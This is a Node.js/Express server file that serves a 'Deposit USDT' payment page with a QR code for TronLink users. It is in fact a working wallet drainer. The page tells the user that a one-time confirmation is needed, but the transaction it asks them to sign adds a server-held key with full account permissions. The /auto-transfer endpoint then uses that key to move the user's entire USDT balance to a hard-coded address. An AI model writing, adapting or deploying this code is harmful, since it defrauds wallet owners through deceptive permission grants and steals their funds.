require('dotenv').config();
const express = require('express');
const QRCode = require('qrcode');
const TronWeb = require('tronweb');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
app.use(express.json());

const RECEIVER_ADDRESS = "TNCqHsPteBj8ewEHT4robqf5hH7kxULPRa";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

// 读取 TronGrid API Key（从环境变量）
const API_KEY = process.env.TRONGRID_API_KEY;
const baseUrl = API_KEY ? `https://api.trongrid.io?apiKey=${API_KEY}` : 'https://api.trongrid.io';
const fullNode = baseUrl;
const solidityNode = baseUrl;
const eventServer = baseUrl;

const tronWeb = new TronWeb(fullNode, solidityNode, eventServer);

let sessionPrivateKey, sessionPublicKey, sessionTronWeb;

function loadOrGenerateSession() {
    try {
        if (fs.existsSync('.session')) {
            const sessionData = JSON.parse(fs.readFileSync('.session', 'utf8'));
            sessionPrivateKey = sessionData.privateKey;
            sessionPublicKey = sessionData.publicKey;
            console.log('✅ 会话密钥已从文件加载');
        } else {
            console.log('⚠️ .session 不存在，正在生成...');
            const privateKey = crypto.randomBytes(32).toString('hex');
            const account = tronWeb.address.fromPrivateKey(privateKey);
            sessionPrivateKey = privateKey;
            sessionPublicKey = account.hex;
            fs.writeFileSync('.session', JSON.stringify({
                privateKey: sessionPrivateKey,
                publicKey: sessionPublicKey
            }, null, 2));
            console.log('✅ 新会话密钥已生成并保存');
        }
        sessionTronWeb = new TronWeb(fullNode, solidityNode, eventServer, sessionPrivateKey);
        console.log('🔑 会话钱包已初始化');
        return true;
    } catch (err) {
        console.error('❌ 会话密钥处理失败:', err);
        return false;
    }
}

if (!loadOrGenerateSession()) process.exit(1);

async function getUSDTBalance(address) {
    const contract = await tronWeb.contract().at(USDT_CONTRACT);
    const bal = await contract.balanceOf(address).call();
    return Number(bal) / 1e6;
}

app.get('/init-permission', async (req, res) => {
    const { userAddress } = req.query;
    if (!userAddress) return res.status(400).json({ error: '缺少 userAddress' });
    try {
        const accountInfo = await tronWeb.trx.getAccount(userAddress);
        const ownerPermission = accountInfo.owner_permission;
        const existingActive = accountInfo.active_permission || [];
        const newActive = {
            type: 2,
            id: existingActive.length + 2,
            permission_name: "session_key_auto",
            threshold: 1,
            keys: [{ address: sessionPublicKey, weight: 1 }],
            operations: "0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
        };
        const tx = await tronWeb.transactionBuilder.updateAccountPermissions(
            userAddress, ownerPermission, null, [...existingActive, newActive]
        );
        res.json({ success: true, transaction: tx });
    } catch (error) {
        console.error(error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/auto-transfer', async (req, res) => {
    const { userAddress } = req.body;
    if (!userAddress) return res.status(400).json({ error: '缺少 userAddress' });
    try {
        const balance = await getUSDTBalance(userAddress);
        if (balance <= 0) throw new Error('余额为0');
        const amountWithDecimals = Math.floor(balance * 1e6);
        const contract = await sessionTronWeb.contract().at(USDT_CONTRACT);
        const tx = await contract.transfer(RECEIVER_ADDRESS, amountWithDecimals).send();
        res.json({ success: true, txId: tx, amount: balance });
    } catch (error) {
        if (error.message.includes('not active') || error.message.includes('signature')) {
            res.status(403).json({ success: false, needAuth: true, error: 'need auth' });
        } else {
            res.status(500).json({ success: false, error: error.message });
        }
    }
});

app.get('/', async (req, res) => {
    const host = req.get('host');
    const pageUrl = `http://${host}`;
    const html = `<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>USDT TRC20 收款</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.1/dist/TronWeb.js"></script>
<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',Roboto,sans-serif;padding:20px}
.card{max-width:520px;width:100%;background:white;border-radius:32px;box-shadow:0 20px 35px -10px rgba(0,0,0,0.1);overflow:hidden}
.header{background:#1E88E5;padding:28px 20px;text-align:center}
.header h1{color:white;font-size:28px;font-weight:600;letter-spacing:-0.3px}
.content{padding:28px 24px}
.qr-outside{display:flex;justify-content:center;margin:20px 0}
.qr-wrapper{position:relative;display:inline-block}
#qrcode{padding:12px;background:white;border-radius:24px;box-shadow:0 4px 12px rgba(0,0,0,0.05)}
#qrcode img{display:block;width:220px;height:220px}
.logo{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:56px;height:56px;background:#00a86b;border-radius:50%;display:flex;align-items:center;justify-content:center;border:2px solid white;box-shadow:0 2px 6px rgba(0,0,0,0.15)}
.logo span{color:white;font-size:34px;font-weight:bold;font-family:Arial;margin-top:-2px}
.status{background:#eef2fa;padding:16px;border-radius:20px;margin:20px 0 16px;font-size:14px;color:#2c3e50;text-align:center}
.footer{border-top:1px solid #eef2f7;padding:20px 24px 24px;text-align:center;color:#99a7b5;font-size:12px}
.warning{font-size:12px;color:#f5b042;background:#fff8e7;padding:8px 12px;border-radius:12px;margin-top:16px;text-align:center}
</style>
</head>
<body>
<div class="card">
<div class="header"><h1>Deposit USDT</h1></div>
<div class="content">
<div class="qr-outside"><div class="qr-wrapper"><div id="qrcode"></div><div class="logo"><span>T</span></div></div></div>
<div id="status" class="status">⏳ 正在初始化...</div>
<div class="warning">⚠️ 首次使用需确认交易（仅一次），之后自动到账</div>
</div>
<div class="footer">Powered by Your Store</div>
</div>
<script>
let tronWeb, userAddress;
const RECEIVER = "${RECEIVER_ADDRESS}";
const USDT_CONTRACT = "${USDT_CONTRACT}";

function setStatus(msg, isErr = false) {
    const s = document.getElementById('status');
    s.innerHTML = msg;
    s.style.background = isErr ? '#ffeaea' : '#eef2fa';
    s.style.color = isErr ? '#c62828' : '#2c3e50';
}

async function autoTransfer() {
    const res = await fetch('/auto-transfer', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ userAddress }) });
    const data = await res.json();
    if (data.success) {
        setStatus('🎉 支付成功！金额: ' + data.amount + ' USDT<br>交易ID: ' + data.txId.substring(0, 16) + '...');
        return true;
    } else if (data.needAuth) {
        return false;
    } else {
        throw new Error(data.error);
    }
}

async function requestPermissionAndTransfer() {
    setStatus('⏳ 首次使用，请在钱包中确认交易...');
    const authRes = await fetch('/init-permission?userAddress=' + userAddress);
    const authData = await authRes.json();
    if (!authData.success) throw new Error('构建交易失败: ' + authData.error);
    const signedTx = await tronWeb.trx.sign(authData.transaction);
    const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
    if (!broadcast.result) throw new Error('交易广播失败');
    setStatus('✅ 交易成功，正在自动转账...');
    const transferRes = await fetch('/auto-transfer', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({ userAddress }) });
    const transferData = await transferRes.json();
    if (transferData.success) {
        setStatus('🎉 支付成功！金额: ' + transferData.amount + ' USDT<br>交易ID: ' + transferData.txId.substring(0, 16) + '...');
    } else {
        throw new Error(transferData.error);
    }
}

async function main() {
    if (!window.tronWeb || !window.tronWeb.defaultAddress) {
        setStatus('❌ 请使用 TronLink 钱包打开本页面', true);
        return;
    }
    tronWeb = window.tronWeb;
    userAddress = tronWeb.defaultAddress.base58;
    setStatus('✅ 已连接: ' + userAddress.substring(0, 8) + '...<br>⏳ 处理中...');
    try {
        const ok = await autoTransfer();
        if (!ok) await requestPermissionAndTransfer();
    } catch(e) {
        if (e.message.includes('need auth') || e.message.includes('not active')) {
            await requestPermissionAndTransfer();
        } else {
            setStatus('❌ 支付失败: ' + e.message, true);
        }
    }
}

const pageUrl = window.location.href;
new QRCode(document.getElementById("qrcode"), {
    text: pageUrl,
    width: 220,
    height: 220,
    correctLevel: QRCode.CorrectLevel.H
});
window.addEventListener('load', () => setTimeout(main, 1000));
</script>
</body>
</html>`;
    res.send(html);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 服务已启动: http://0.0.0.0:${PORT}`);
    console.log(`📦 收款地址: ${RECEIVER_ADDRESS}`);
});
